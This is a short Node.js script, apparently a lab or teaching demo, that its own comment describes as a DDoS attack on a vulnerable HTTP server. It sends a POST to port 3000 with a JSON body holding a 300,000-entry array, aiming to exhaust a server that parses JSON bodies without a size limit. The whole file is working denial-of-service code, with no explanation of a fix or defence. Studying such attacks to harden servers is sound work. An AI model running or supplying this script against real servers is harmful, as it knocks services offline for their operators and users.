/**
 * Performing a DDoS attack on vulnerable HTTP server
 */
 const http = require('http');
 const req = http.request({
    method: 'POST',
    port: 3000,
    headers: {
        'Content-Type': 'application/json'      // notify server that you're sending JSON data
        // 'Content-Length': 40 * 1024
    }
});

req.write('[');     // begin sending a very large array object
let n = 300000;
while (n--) {
    req.write('"foo",');    // array contains 300,000 "foo" string entries
}
req.write('"bar"]');
req.end();
